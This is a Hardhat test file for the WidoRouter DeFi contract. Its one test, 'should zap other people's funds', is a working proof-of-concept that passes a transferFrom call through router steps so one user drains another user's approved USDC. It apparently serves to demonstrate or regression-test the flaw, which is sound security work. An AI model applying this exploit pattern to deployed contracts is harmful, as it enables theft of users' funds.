import {expect} from "./setup/chai-setup";
import * as utils from "./utils/test-utils";

import {ethers, deployments, getUnnamedAccounts} from "hardhat";
import {ERC20, WidoRouter} from "../typechain";
import {setupUsers} from "./utils/users";
import {USDC_MAP, WETH_MAP, ZERO_ADDRESS} from "./utils/addresses";
import {ChainName} from "wido";
import {IWidoRouter} from "../typechain/contracts/WidoRouter";
import {beforeAll, describe, it} from "vitest";

const setup = deployments.createFixture(async () => {
  await deployments.fixture(["WidoRouter", "USDC"]);
  const contracts = {
    WidoRouter: <WidoRouter>await ethers.getContract("WidoRouter"),
    USDC: <ERC20>await ethers.getContract("USDC"),
  };
  const users = await setupUsers(await getUnnamedAccounts(), contracts);
  return {
    ...contracts,
    users,
  };
});

const executeOrderFn =
  "executeOrder((address,address,address,uint256,uint256,uint32,uint32),(address,address,address,bytes,int32)[],uint256,address)";

describe(`WidoManager`, function () {
  if (!["mainnet"].includes(process.env.HARDHAT_FORK as ChainName)) {
    return;
  }
  let alice: {address: string} & {WidoRouter: WidoRouter};
  let bob: {address: string} & {WidoRouter: WidoRouter};

  let widoRouter: WidoRouter;
  let usdcContract: ERC20;

  beforeAll(async function () {
    const {WidoRouter, users, USDC} = await setup();
    widoRouter = WidoRouter;
    usdcContract = USDC;
    alice = users[0];
    bob = users[1];
  });

  it(`should zap other people's funds`, async function () {
    // arrange
    const ETH = ZERO_ADDRESS;
    const WETH = WETH_MAP.mainnet;
    const USDC = USDC_MAP.mainnet;
    const stolenAmount = String(100 * 1e6);

    await utils.prepForToken(bob.address, USDC, stolenAmount);
    await utils.approveForToken(await ethers.getSigner(bob.address), USDC, widoRouter.address);
    // act
    const steps: IWidoRouter.StepStruct[] = [
      {
        fromToken: WETH,
        toToken: USDC,
        targetAddress: usdcContract.address,
        data: usdcContract.interface.encodeFunctionData("transferFrom", [
          bob.address,
          widoRouter.address,
          stolenAmount,
        ]),
        amountIndex: -1,
      },
    ];
    await alice.WidoRouter.functions[executeOrderFn](
      {
        user: alice.address,
        fromToken: ETH,
        toToken: USDC,
        fromTokenAmount: "1",
        minToTokenAmount: stolenAmount,
        nonce: "0",
        expiration: "0",
      },
      steps,
      30,
      ZERO_ADDRESS,
      {
        value: 1,
      }
    );
    // assert
    expect(await utils.balanceOf(USDC, alice.address)).to.equal(stolenAmount);
    expect(await utils.balanceOf(USDC, bob.address)).to.equal("0");
  });
});
